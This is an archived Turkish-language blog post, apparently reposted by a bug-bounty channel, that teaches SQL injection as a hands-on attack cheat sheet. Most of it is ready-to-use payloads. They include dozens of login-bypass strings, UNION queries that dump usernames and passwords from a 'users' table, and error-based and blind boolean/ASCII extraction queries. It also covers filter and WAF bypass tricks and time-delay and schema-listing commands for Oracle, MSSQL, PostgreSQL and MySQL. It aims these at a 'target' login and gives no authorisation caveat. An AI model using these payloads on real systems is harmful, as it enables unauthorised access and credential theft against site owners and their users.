# SQL INJECTION EXPLOİT

- **Source URL:** https://medium.com/@bdsec/sql-injection-exploi%CC%87t-eb47970ed56a?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20231012113601/https://medium.com/@bdsec/sql-injection-exploi%CC%87t-eb47970ed56a
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3798 (id 3798)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**SQL nedir?**

SQL, verileri yönetmek ve tasarlamak için kullanılan bir dildir. SQL, kendisi bir programlama dili olmamasına rağmen birçok kişi tarafından programlama dili olarak bilinir. SQL herhangi bir veri tabanı ortamında kullanılan bir alt dildir.


# SQL İNJECTİON nedir ?

SQL enjeksiyonu, veri tabanına dayalı uygulamalara saldırmak için kullanılan bir atak tekniğidir; burada saldırgan SQL dili özelliklerinden faydalanarak standart uygulama ekranındaki ilgili alana yeni SQL ifadelerini ekler, Ayrıca Sql injection risk seviyesi yüksek en tehlikeli açıklardan bir tanesidir.


# LOGİN KISMINDA SQL İNJECTİON

eğer hedef sistemin login kısmını bulduysanız genellikle kullanıcı adı admin olur ilk olarak admin:admin denemeniz eğer giriş yapamıyorsanız sql injection kullanarak admin hesabına giriş yapmaya çalışmak olmalı. ilk olarak kullanıcı adı kısmına “ **admin’# “** şifre kısmına ise random birşey gir ve dene eğer filtre vb bir önlem alınmadıysa girişiniz yapılcaktır eğer bir filtreleme var ise onlarıda filtreleme bypass kısmında anlatacağım ek olarak bu komudu da deneyebilirsin **admin’ —** hesaba giriş yapabilirsin şimdi sana login kısmında kullanabileceğin bazı kodları vereceğim;

admin’# 

admin’ — -

admin’/\*

deneme’ OR 1=1 — 

deneme’ OR 1=1#

deneme’+OR+1=1 — 

deneme’+OR+1=1#

admin” — 

admin” #

admin”/\*

admin” or “1”=”1

admin” or “1”=”1" — 

admin” or “1”=”1"#

admin” or “1”=”1"/\*

admin”or 1=1 or “”=”

admin” or 1=1

admin” or 1=1 — 

admin” or 1=1#

admin” or 1=1/\*

admin”) or (“1”=”1

admin”) or (“1”=”1" — 

admin”) or (“1”=”1"#

admin”) or (“1”=”1"/\*

admin”) or “1”=”1

admin”) or “1”=”1" — 

admin”) or “1”=”1"#

admin”) or “1”=”1"/\*

or 1=1

or 1=1 — 

or 1=1#

or 1=1/\*

admin’ — 

admin’ #

admin’/\*

admin’ or ‘1’=’1

admin’ or ‘1’=’1' — 

admin’ or ‘1’=’1'#

admin’ or ‘1’=’1'/\*

admin’or 1=1 or ‘’=’

admin’ or 1=1

admin’ or 1=1 — 

admin’ or 1=1#

admin’ or 1=1/\*

admin’) or (‘1’=’1

admin’) or (‘1’=’1' — 

admin’) or (‘1’=’1'#

admin’) or (‘1’=’1'/\*

admin’) or ‘1’=’1

admin’) or ‘1’=’1' — 

admin’) or ‘1’=’1'#

admin’) or ‘1’=’1'/\*


# SQL İNJECTİON YORUM SATIRI

Bir sorguyu kısaltmak ve orijinal sorgunun girişinizi takip eden kısmını kaldırmak için yorumları kullanabilirsiniz.Ayrıca daha fazlasına burdan ulaşabilirsin >>[bdsec](https://portswigger.net/web-security/sql-injection/cheat-sheet) \<\<

Oracle`--comment`Microsoft`--comment`

/\*comment\*/

PostgreSQL`--comment`

/\*comment\*/

MySQL`#comment`

`-- comment` \[

`/*comment*/`


# SQL INJECTION TESPİT ETME

öncellikle herkes sql tespit etmek için tek tırnak koymakta ama bazı sistemlerde tek tırnak kara listede olabiliyor ve bundan ötürü sql olsa bile bazen tespit edemiyoruz ve üstüne üstlük banlanıyoruz, Bu yüzden size daha farklı bir yol ile bu konuya değinmek isteyeceğim toplama,çıkarma,çarpma,üs alma gibi işlemleri yazılım ve programlama dillerinde kullanabildiğimiz gibi sql dilinde de kullanabiliyoruz örnek olarak ?id=1 bu parametreli sitedeki içeriğe iyi bakıp aklınızda tutun sonra id değerini 2 yapın farklı bir içerik gelicek sonrasında ise **?id=2–1** yapın ve 1 no lu id deki içerik geliyorsa sql injection afiyet olsun yada 3 nolu id deki içeriğe bak aklında tut ve id kısmına = ?id=**2^1** yaz 3 no lu id deki içerik ile aynı ise yine sql injection var demek yada ?id=1'’ (2 adet tek tırnak koy) eğer sistemde uyarı yada bozulma yok ise çalışıyorsa yine mevcut sonra kolon bulmalısın id den sonra UNION SELECT 1,2,3,4,5, hata gidene kadar dene

(eğer ekranda çok yazı içerik var ise id değerine -999999 gir tek senin sorgun çalışcak)

parametreler;

2–1

2¹

‘’

‘

sqlden tespit sonrası parametreler;

UNION SELECT 1,2,3,4,5 (HATA GİDENE KADAR)


# UNION SQLi

Enjeksiyon sırasında kolon sayısının “union” anahtar kelimesi kullanarak birkaç farklı seçimin bir arada yapıldığı enjeksiyon türüdür


sql injection ı hata mesajı ile genellikle gösterir bu yüzden işimiz kolaydır.injection ı basit şekilde tespit ettikten sonra kolonları üstte önerdiğimiz gibi buluyoruz ve sıra tablo ismini öğrenmekte ;

?id=1 **UNION SELECT 1,2,table\_name,4,5 FROM information\_schema.tables WHERE table\_schema = database()** (tablo şemasının mevcuttaki database eşit olanları getir dedik)


sonrasında ise kolonları çekiyoruz ;

?id=**-99999 UNION SELECT 1,2,column\_name,4,5 FROM information\_schema.columns WHERE table\_name = ‘users’** (users tablosu kolon çekme )


tablo içindeki kolonlardaki bilgileri okumak için ;

?id=**-99999 UNION SELECT 1,2,passwd,username,5 FROM users** (bilgiler çok iç içe geliyorsa **1,2,concat(uname,’:bdsec:’passwd),4,5 FROM users)**


# ERROR BASED SQLi

İsminden de anlaşılacağı üzere hata mesajlarına dayanan SQL enjeksiyon türüdür. “,’#”\< gibi karakterlerin kullanılmasıyla ortaya çıkmaktadır nasıl tespit edilceğini zaten sql inj tespit etme kısmında anlattım

?id=1 **UNION SELECT extractvalue(rand(), concat(1,(SELECT database())))** {database ismi öğrenme bundan sonraki işlemleri basit şekilde yapabilirsiniz}


burdan sonrası aslında kolay union sqli da kullandığımız kumutlar ile devam ediyorsunuz üstte verdiim kodu database kısmını değiştirip tabloları kolonları içindeki bilgileri limit 1,1 2,1 gibi vererek bulabilirsiniz

# BOOLEN BASED SQLi

Ekrana hata mesajının yazdırılmadığı, kör olarak uygulanması gereken SQL Injection tekniğidir

?id=1 and (SELECT 1)=1 (içerik gözüküyor olması gerek sonrasında ?id=1 and (SELECT 1)=2 de içerik gidiyorsa boolen based sqli var demektir) sql inj zor halidir ?id=1 **and SUBSTRING ((SELECT table\_name FROM information\_schema.tables WHERE table\_schmea=database()LIMIT 1.1),1,1)=’a’** (harfleri dene içerik gelince tablonun ilk adını buldun sonra en dıştaki 1,1 den baştaki 1i 2 yap ve tekrar alfabe dene) HIZLANDIRMAK İÇİM ASCİİ EKLİYORUZ ;

**and ASCII(SUBSTRING ((SELECT table\_name FROM information\_schema.tables WHERE table\_schmea=database()LIMIT 1.1),1,1))>80** (80den büyükse özel karakter falan yok google dan bak ascıı tablo)


# SQL İNJECTİON BYPASS

sql inj cheatsheat yada waf bypass sql injection diye google da aratarak belli başlı şeyleri bulabilirsin ben birkaç etkili bişeyden bahsedeceğim

‘ işaretinde filtre olabilir onu sil öyle dene

boşluklar filtrelenmiş ise (+)

dene kelime filtrelenmiş ise büyük küçük karışık yaz(uNıOn)

# E filtre var ise ( — )yada(//)dene

url encode dene

burp suite ile dene isteği yakala sonra değiştir

eğer belirli şeyler filtrelenmişse hex kodunu burp üzerinden al dene

char encode dene


# Time delays

zaman geciktirme

Oracle`dbms_pipe.receive_message(('a'),10)`

Microsoft`WAITFOR DELAY '0:0:10'`

PostgreSQL`SELECT pg_sleep(10)`

MySQL`SELECT SLEEP(10)`


# Database contents

Veritabanında bulunan tabloları ve bu tabloların içerdiği sütunları listeleyebilirsiniz.

Oracle`SELECT * FROM all_tables`

SELECT \* FROM all\_tab\_columns WHERE table\_name = 'TABLE-NAME-HERE'

Microsoft`SELECT * FROM information_schema.tables`PostgreSQL

SELECT \* FROM information\_schema.columns WHERE table\_name = 'TABLE-NAME-HERE'`SELECT * FROM information_schema.tables`MySQL

SELECT \* FROM information\_schema.columns WHERE table\_name = 'TABLE-NAME-HERE'`SELECT * FROM information_schema.tables`

SELECT \* FROM information\_schema.columns WHERE table\_name = 'TABLE-NAME-HERE'


sql injection ile alakalı birkaç bağlantı bırakıyorum [hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection) , [invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) , [portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
